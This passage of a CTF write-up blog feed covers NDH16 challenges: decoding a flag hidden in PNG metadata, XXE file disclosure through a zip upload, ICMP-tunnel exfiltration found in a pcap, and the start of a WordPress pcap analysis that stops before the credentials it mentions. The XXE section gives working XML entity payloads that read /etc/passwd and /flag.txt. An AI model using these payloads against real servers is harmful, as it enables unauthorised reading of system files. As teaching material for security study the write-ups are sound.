&lt;p&gt;We will call this file “basiq.png” for more readability.&lt;/p&gt;

&lt;p&gt;Driven by my desire for revenge, I’ve had a look at metadata in this new file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool basiq.png
ExifTool Version Number         : 11.03
File Name                       : basiq.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 210 kB
File Modification Date/Time     : 2018:07:01 00:16:42+02:00
File Access Date/Time           : 2018:07:05 23:12:37+02:00
File Inode Change Date/Time     : 2018:07:01 00:18:01+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 510
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Special Instructions            : 4D4A57564533324E4B524E474D5A4A544F5256553436544850424844455354494A555A4653364B5A474A4D5445544B584C453255344D5356474E475855514C5A4A555A4555334B5049524354435753584A4A5755365632474E5247573252544B4A56564655323232495247584F574C4E4A553245325243534E42484732534A524A5A4346534D433249354C47595453454E4D32453656324F4E4A4E4649554C324A564C565336434F4E4A4558515753584B4532553652434B4E564E4549554C594C4A57554B4E434E495241584F54544E4A553245365632534E4A4D5855524A544C4A4B464B36535A4B5249584F5432454C4A554655334B4B4E4A4D564F534C324C455A455532535049354954475454324A555A553256434B4E524846495A5A534A555A54434F493D
Gamma                           : 2.2222
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
Background Color                : 255 255 255
Pixels Per Unit X               : 15748
Pixels Per Unit Y               : 15748
Pixel Units                     : meters
Modify Date                     : 2017:09:22 12:01:42
Datecreate                      : 2017-09-22T14:01:42+02:00
Datemodify                      : 2017-09-22T14:01:42+02:00
Signature                       : 5e6790047fb3e3c8a74d63cdf6e91766d0ba9f513f8d5ea2020e51514bc3ee05
Image Size                      : 680x510
Megapixels                      : 0.347
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once again, a special field caught my attention. Guess which one…&lt;/p&gt;

&lt;p&gt;Well, let’s give it a second chance, knowing that the Rick Roll threat was hanging over me.&lt;/p&gt;

&lt;p&gt;The message surely is encoded, but how ? We will figure this out by trying all of the potential encoding:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Base64 gave nothing relevant.&lt;/li&gt;
  &lt;li&gt;Can’t be Base32 because of invalid characters such as “0” and “1”.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Base16&lt;/strong&gt;? The most likely possibility. Python will help us verify it.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;boiteaklou&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apr&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;4D4A5756[...]4F493D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'MJWVE32NKRNGMZJTORVU46THPBHDESTIJUZFS6KZGJMTETKXLE2U4MSVGNGXUQLZJUZEU3KPIRCTCWSXJJWU6V2GNRGW2RTKJVVFU222IRGXOWLNJU2E2RCSNBHG2SJRJZCFSMC2I5LGYTSENM2E6V2ONJNFIUL2JVLVS6CONJEXQWSXKE2U6RCKNVNEIULYLJWUKNCNIRAXOTTNJU2E6V2SNJMXURJTLJKFK6SZKRIXOT2ELJUFU3KKNJMVOSL2LEZEU2SPI5ITGTT2JUZU2VCKNRHFIZZSJUZTCOI='&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great! We have another base-encoded message! I’ll skip the determination process for this one, we’re dealing with &lt;strong&gt;base32&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MJWVE32NKR[...]ZSJUZTCOI=&quot;&lt;/span&gt; | base32 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
bmRoMTZfe3tkNzgxN2JhM2YyY2Y2MWY5N2U3MzAyM2JmODE1ZWJmOWFlMmFjMjZkZDMwYmM4MDRhNmI1NDY0ZGVlNDk4OWNjZTQzMWYxNjIxZWQ5ODJmZDQxZmE4MDAwNmM4OWRjYzE3ZTUzYTQwODZhZmJjYWIzY2JjOGQ3NzM3MTJlNTg2M319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One more! Let me guess, &lt;strong&gt;base64&lt;/strong&gt; this time?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bmRoMTZf[...]NTg2M319&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
ndh16_&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;d7817ba3f2cf61f97e73023bf815ebf9ae2ac26dd30bc804a6b5464dee4989cce431f1621ed982fd41fa80006c89dcc17e53a4086afbcab3cbc8d773712e5863&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright, this was the final step! Congratz’ :triangular_flag_on_post:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.</summary></entry><entry><title type="html">XML External Entities: Wonkachall-step1 - NDH16</title><link href="http://localhost:4000/Wonka-chall-step1-NDH16.html" rel="alternate" type="text/html" title="XML External Entities: Wonkachall-step1 - NDH16" /><published>2018-07-03T22:00:00+02:00</published><updated>2018-07-03T22:00:00+02:00</updated><id>http://localhost:4000/Wonka-chall-step1-NDH16</id><content type="html" xml:base="http://localhost:4000/Wonka-chall-step1-NDH16.html">&lt;p&gt;This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#take-my-golden-ticket&quot; id=&quot;markdown-toc-take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#thats-not-a-ticket&quot; id=&quot;markdown-toc-thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;We have &lt;a href=&quot;http://willywonka.shop:4242/&quot;&gt;a website&lt;/a&gt; which is actually The Golden Ticket Blackmarket platform. It proposes a list of purchasable golden tickets where each ticket has a bitcoin cost, a name and an address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/tickets.png&quot; alt=&quot;Wonka Shop screen capture&quot; title=&quot;Willy Wonka Shop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The challenge statement says that the flag is stored in ““/flags.txt”. The objective is to take control of this website. Hurry up!&lt;/p&gt;

&lt;h2 id=&quot;take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/h2&gt;

&lt;p&gt;The first reflex to have when you arrive on a website should be to hit “CTRL+U” and dive deep into the source code.
The vast majority of this website is static at the exception of the “/upload.php” page. We are able to upload a zip archive containing a &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; and a &lt;strong&gt;Ticket&lt;/strong&gt; as shown in the provided example.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/upload.png&quot; alt=&quot;Upload page screen capture&quot; title=&quot;Upload page&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;Ticket file&lt;/strong&gt; contains a string representing the content of the Golden Ticket and the &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; stores the three variables displayed on the home page for each ticket, as shown below:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Wait a second… it means that the server is parsing XML files in order to get these values… Very interesting! :smiling_imp:&lt;/p&gt;

&lt;p&gt;Have you ever heard of XML external entities?&lt;/p&gt;

&lt;h2 id=&quot;thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/h2&gt;

&lt;p&gt;XML External Entity Processing attack aim at exploiting &lt;strong&gt;weakly configured XML parsers&lt;/strong&gt;. The objective is to reference external entities inside the XML document in order to &lt;strong&gt;access local resources&lt;/strong&gt; or to &lt;strong&gt;execute code remotely&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Alright, now let’s modify our MANIFEST.xml to detect if the website is vulnerable. I suggest the following payload, supposed to include “/etc/passwd” and to display it in place of the ticket’s address:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we zip the MANIFEST and the Ticket, we upload it and… :tada:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/etcpasswd.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;/etc/passwd&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Say Hello to the list of users!&lt;/p&gt;

&lt;p&gt;Fine, now we can forge the payload that will allow us to retrieve the flag located under “/flag.txt”. This is basically the same payload as before in which we replace the target file as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here comes the reward! :triangular_flag_on_post:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/flag.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;Flag&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now read the writeup of Wonkachall-step2 :wink:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.</summary></entry><entry><title type="html">Data exfiltration with PING: ICMP - NDH16</title><link href="http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16.html" rel="alternate" type="text/html" title="Data exfiltration with PING: ICMP - NDH16" /><published>2018-07-02T22:00:00+02:00</published><updated>2018-07-02T22:00:00+02:00</updated><id>http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16</id><content type="html" xml:base="http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16.html">&lt;p&gt;An interesting forensic challenge covering a famous method of data exfiltration…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pretty-heavy-for-a-ping&quot; id=&quot;markdown-toc-pretty-heavy-for-a-ping&quot;&gt;Pretty heavy for a ping…&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#gimme-your-data&quot; id=&quot;markdown-toc-gimme-your-data&quot;&gt;Gimme your data!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;We are given &lt;a href=&quot;http://localhost:4000/assets/2018-07-02/analysis.pcap&quot;&gt;a packet capture&lt;/a&gt; showing lots of &lt;strong&gt;Echo Requests / Replies&lt;/strong&gt; between the same two computers and we’re supposed to investigate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pretty-heavy-for-a-ping&quot;&gt;Pretty heavy for a ping…&lt;/h2&gt;

&lt;p&gt;The ICMP protocol is pretty simple and does not contain a lot of information. However, it includes a &lt;strong&gt;data field&lt;/strong&gt; used notably in error messages. This data field can also be used for creating an &lt;strong&gt;ICMP tunnel&lt;/strong&gt; between two remote computers where hosts inject data into icmp echo packets. This method is often used to &lt;strong&gt;bypass firewall rules&lt;/strong&gt; in the aim of &lt;strong&gt;exfiltrating data&lt;/strong&gt;.
Such process can be detected by analyzing ICMP echo packets’ size. These packets usually don’t exceed 100 bytes. Here, each of them is 542 bytes long.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/icmp_packet_size.png&quot; alt=&quot;ICMP packet size&quot; title=&quot;ICMP Packet size&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We definitively should have a look at what takes so much space.&lt;/p&gt;

&lt;h2 id=&quot;gimme-your-data&quot;&gt;Gimme your data!&lt;/h2&gt;

&lt;p&gt;I wrote a simple python script &lt;strong&gt;extracting the data section&lt;/strong&gt; of ICMP echo request packets. For this, I used the &lt;strong&gt;Scapy&lt;/strong&gt; module, which is for me the best tool when it comes to handling packet captures, due to its effectiveness and simplicity of use. My script also &lt;strong&gt;converts extracted data to ASCII&lt;/strong&gt; because it occured to be base64 encoded, which is not surprising since it avoids encoding errors during the transmission.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'analysis.pcap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Echo request&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;NOTE: I only kept request packets since replies send back same data and can cause errors when recovering exfiltrated data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The hidden text reveals to be a part of the very famous &lt;em&gt;“Hacker Manifesto”&lt;/em&gt; followed by the man page of the “ping” tool.
Right between the two texts lies our reward… :triangular_flag_on_post:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I am a hacker, and this is my manifesto.  You may stop this individual,
but you can't stop us all... after all, we're all alike.

                              +++The Mentor+++


Congratulations, ICMP exfiltatration is awesome! The flag is : ndh2k18_017395f4c6312759



Now let's read the manual of one of the best tools you never had!

PING(8)                                  System Manager's Manual: iputils                                  PING(8)

NAME
      ping - send ICMP ECHO_REQUEST to network hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">An interesting forensic challenge covering a famous method of data exfiltration…</summary></entry><entry><title type="html">PCAPNG Forensics: Decode - NDH16</title><link href="http://localhost:4000/PCAPNG-Forensics-NDH-Decode.html" rel="alternate" type="text/html" title="PCAPNG Forensics: Decode - NDH16" /><published>2018-07-01T18:00:00+02:00</published><updated>2018-07-01T18:00:00+02:00</updated><id>http://localhost:4000/PCAPNG-Forensics-NDH-Decode</id><content type="html" xml:base="http://localhost:4000/PCAPNG-Forensics-NDH-Decode.html">&lt;p&gt;A warm-up forensic challenge proposed by NDH16…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#wiresharks-power&quot; id=&quot;markdown-toc-wiresharks-power&quot;&gt;Wireshark’s power&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#what-about-the-zip&quot; id=&quot;markdown-toc-what-about-the-zip&quot;&gt;What about the zip?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
&lt;p&gt;We are given &lt;a href=&quot;/assets/2018-07-01/decode.pcapng&quot;&gt;a packet capture&lt;/a&gt; and &lt;a href=&quot;.assets/2018-07-01/Decode_.zip&quot;&gt;a zip archive&lt;/a&gt; which have to be investigated.&lt;/p&gt;

&lt;h2 id=&quot;wiresharks-power&quot;&gt;Wireshark’s power&lt;/h2&gt;
&lt;p&gt;Let’s open this packet capture with Wireshark, it’s simply one of the best and easiest-to-use tool for analyzing network captures.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each request is sent to localhost (127.0.0.1) so this capture probably shows interactions between the client and the local  in-development server.&lt;/p&gt;

&lt;p&gt;We can see that &lt;strong&gt;HTTP&lt;/strong&gt; is used over &lt;strong&gt;TCP&lt;/strong&gt; so the best thing to do is to use the &lt;em&gt;“Follow HTTP stream”&lt;/em&gt; option in order to undesrtand the nature of the resquets shown here.&lt;/p&gt;

&lt;p&gt;The GET request at destination of &lt;strong&gt;/wp-login.php&lt;/strong&gt; indicates us that we are dealing with a &lt;strong&gt;wordpress&lt;/strong&gt; site. The next HTTP POST request seems very interesting because it should contain the authentication parameters of the website’s administrator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/httpstream.png&quot; alt=&quot;HTTP stream screen capture&quot; title=&quot;HTTP stream&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indeed, we see the following admin credentials in the request parameters.&lt;/p&gt;

